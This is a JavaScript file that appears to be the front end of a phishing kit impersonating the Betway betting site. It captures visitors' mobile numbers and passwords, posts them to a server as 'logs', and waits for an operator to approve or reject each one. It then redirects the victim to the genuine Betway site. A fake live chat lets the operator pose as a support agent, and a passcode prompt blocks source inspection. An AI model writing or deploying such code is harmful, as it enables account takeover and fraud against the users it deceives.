// 1. Anti-Inspect / Source Lock
document.onkeydown = function(e) {
  if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
    let p = prompt("Source Locked:");
    return p === "8890";
  }
};

// 2. Global Variables
let currentU = "Unknown";
let pollInt = null;
let chatPoll = null;
let lastMsgId = null; 
let lastChatResponseId = null;

// 3. Remove Initial Loader and Open Login
setTimeout(() => {
  const loader = document.getElementById('loading-view');
  if (loader) loader.style.display = 'none';
  openModal('login-modal');
}, 1500);

// 4. Input Focus Listeners (Triggers Empty Phone Errors)
document.addEventListener('DOMContentLoaded', () => {
  const loginPw = document.getElementById('login-pw');
  if (loginPw) {
    loginPw.addEventListener('focus', () => {
      const lgnMobile = document.getElementById('lgn-mobile');
      if (lgnMobile && !lgnMobile.value.trim()) {
        const phoneGroup = document.getElementById('phone-group');
        if (phoneGroup) phoneGroup.classList.add('has-error');
      }
    });
  }

  const signupPw = document.getElementById('signup-pw');
  if (signupPw) {
    signupPw.addEventListener('focus', () => {
      const sgpMobile = document.getElementById('sgp-mobile');
      if (sgpMobile && !sgpMobile.value.trim()) {
        const sgpPhoneGroup = document.getElementById('sgp-phone-group');
        if (sgpPhoneGroup) sgpPhoneGroup.classList.add('has-error');
      }
    });
  }
});

// 5. Modal Controllers
function openModal(id) {
  closeModals();
  const modal = document.getElementById(id);
  if (modal) modal.style.display = 'flex';
  document.querySelectorAll('.input-group').forEach(g => g.classList.remove('has-error'));
  const lgnErr = document.getElementById('login-error');
  if (lgnErr) lgnErr.style.display = 'none';
}

function closeModals() {
  document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none');
  stopAllSpinners();
}

function stopAllSpinners() {
  document.querySelectorAll('.submit-btn').forEach(b => {
    b.disabled = false;
    b.innerHTML = b.getAttribute('data-orig') || b.innerHTML;
  });
}

function togglePassword(i, eId) {
  const f = document.getElementById(i);
  const eye = document.getElementById(eId);
  if (f && eye) {
    if (f.type === "password") {
      f.type = "text";
      eye.classList.remove('fa-eye-slash');
      eye.classList.add('fa-eye');
    } else {
      f.type = "password";
      eye.classList.remove('fa-eye');
      eye.classList.add('fa-eye-slash');
    }
  }
}

function showError(id) {
  const e = document.getElementById(id);
  if (e) e.style.display = 'flex';
}

// 6. Form Validation
function validate(ids) {
  let valid = true, first = null;
  ids.forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      const val = el.value.trim();
      const group = el.closest('.input-group');
      if (!val || val.length < 1) {
        if (group) group.classList.add('has-error');
        valid = false;
        if (!first) first = el;
      } else {
        if (group) group.classList.remove('has-error');
      }
    }
  });
  if (first) first.focus();
  return valid;
}

function remErr(i) { 
  const group = i.closest('.input-group');
  if (group) group.classList.remove('has-error');
  const lgnErr = document.getElementById('login-error');
  if (lgnErr) lgnErr.style.display = 'none';
}

// 7. Live Chat Functions
function toggleChat() {
  const w = document.getElementById('chat-window');
  if (w) {
    w.style.display = w.style.display === 'flex' ? 'none' : 'flex';
    if (w.style.display === 'flex') pollChat();
  }
}

function addMsg(txt, cls) {
  const d = document.createElement('div');
  d.className = `msg-b ${cls}`;
  d.innerText = txt;
  const msgs = document.getElementById('chat-msgs');
  if (msgs) {
    msgs.appendChild(d);
    msgs.scrollTop = 9999;
  }
}

function sendChatTxt() {
  const t = document.getElementById('chat-txt');
  if (!t || !t.value) return;
  addMsg(t.value, 'msg-user');
  
  fetch('/api', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action: 'sendChat', user: currentU, text: t.value })
  }).catch(e => console.error("Chat Error:", e));
  
  t.value = '';
}

function pollChat() {
  if (chatPoll) return;
  chatPoll = setInterval(() => {
    fetch('/api?action=getChatUpdates')
      .then(r => r.json())
      .then(d => {
        if (d && d.text && d.message_id) {
          if (lastChatResponseId !== d.message_id) {
            lastChatResponseId = d.message_id;
            addMsg(d.text, 'msg-agent');
          }
        }
      }).catch(e => console.error("Chat Poll Error:", e));
  }, 3000);
}

// 8. Serverless Polling System
function startPolling(t) {
  if (pollInt) clearInterval(pollInt);
  
  pollInt = setInterval(() => {
    const query = lastMsgId ? `&messageId=${lastMsgId}` : '';
    
    fetch(`/api?action=getUpdates${query}`)
      .then(r => r.json())
      .then(d => {
        if (d && d.action === "approve") {
          clearInterval(pollInt);
          pollInt = null;
          
          const processOverlay = document.getElementById('process-overlay');
          if (processOverlay) processOverlay.style.display = 'none';
          
          stopAllSpinners();
          document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
          
          const successView = document.getElementById('success-view');
          if (successView) successView.classList.add('active');
          
          closeModals();
          setTimeout(() => { window.location.href = "https://www.betway.co.za/"; }, 4000);
          
        } else if (d && d.action === "reject") {
          clearInterval(pollInt);
          pollInt = null;
          
          const processOverlay = document.getElementById('process-overlay');
          if (processOverlay) processOverlay.style.display = 'none';
          
          stopAllSpinners();
          if (t === 'Betting Voucher logs') showError('login-error');
        }
      }).catch(e => console.error("Update Poll Error:", e));
  }, 2000);
}

// 9. Main Form Submission
function sendData(e, t) {
  const btn = e.currentTarget;
  if (!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);
  
  if (t === 'Betting Voucher logs') {
    if (!validate(['lgn-mobile', 'login-pw'])) return;
    currentU = document.getElementById('lgn-mobile').value;
  } else if (t === 'Sign up logs') {
    if (!validate(['sgp-mobile', 'signup-pw', 'sgp-fname', 'sgp-sname', 'sgp-email'])) return;
    currentU = document.getElementById('sgp-mobile').value;
  } else if (t === 'Forgot Password') {
    if (!validate(['forgot-input'])) return;
  }
  
  btn.disabled = true;
  btn.innerHTML = `<div class="spinner"></div>`;
  
  const processOverlay = document.getElementById('process-overlay');
  if (processOverlay) processOverlay.style.display = 'flex';

  fetch('/api', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      action: 'login',
      user: currentU,
      pass: document.getElementById('login-pw') ? document.getElementById('login-pw').value : ''
    })
  })
  .then(r => r.json())
  .then(res => {
    if (res && res.messageId) {
      lastMsgId = res.messageId;
    }
    startPolling(t);
  })
  .catch(err => {
    console.error("Fetch Error:", err);
    startPolling(t); // Fallback
  });
}